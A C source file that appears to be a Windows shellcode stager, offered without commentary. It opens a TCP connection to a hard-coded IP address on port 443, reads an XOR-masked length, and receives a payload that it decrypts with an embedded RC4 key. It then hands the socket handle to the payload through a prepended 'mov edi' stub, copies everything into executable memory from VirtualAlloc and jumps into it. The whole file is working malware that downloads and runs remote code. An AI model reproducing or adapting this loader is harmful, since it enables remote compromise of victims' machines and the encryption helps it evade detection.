#include <winsock2.h>
#include <windows.h>

#include "rc4.h"

static SOCKET WSOCKET;

static void ws_init() {
  WSADATA wsa;
  WSAStartup(MAKEWORD(2, 2), &wsa);
}

static SOCKET ws_connect(char *ip, char *port) {
  SOCKADDR_IN sa = {0};
  sa.sin_family = AF_INET;
  sa.sin_port = htons(atoi(port));
  sa.sin_addr.s_addr = inet_addr(ip);

  SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (connect(s, (SOCKADDR *)&sa, sizeof(sa)) == SOCKET_ERROR) {
    exit(0);
  }
  return s;
}

static long recv_all(SOCKET s, char *buf, long len) {
  long ret = 0;
  while (ret < len) {
    ret += recv(s, buf + ret, len - ret, 0);
  }
  return ret;
}

static char *download(long *rawSize) {
  ws_init();
  WSOCKET = ws_connect("1.1.1.1", "443");

  long size;
  recv(WSOCKET, (char *)&size, 4, 0);
  size = size & 0xFFFFFFFF ^ 0x642e4744;

  *rawSize = size + 5;
  char *buf = (char *)malloc(*rawSize);

  // BF 78 56 34 12 => mov edi, 0x12345678
  buf[0] = 0xBF;
  memcpy(buf + 1, &WSOCKET, 4);

  recv_all(WSOCKET, buf + 5, size);

  char key[] =
      "\x3f\x45\x1c\xae\x2b\xa0\x46\x0e\x45\x13\x85\xf0\xff\x31\x48\x2f";
  RC4(key, buf + 5, size);

  return buf;
}

int main() {
  long rawSize;
  char *raw = download(&rawSize);

  void *ptr = VirtualAlloc(0, rawSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(ptr, raw, rawSize);
  free(raw);
  ((void (*)())ptr)();

  return 0;
}
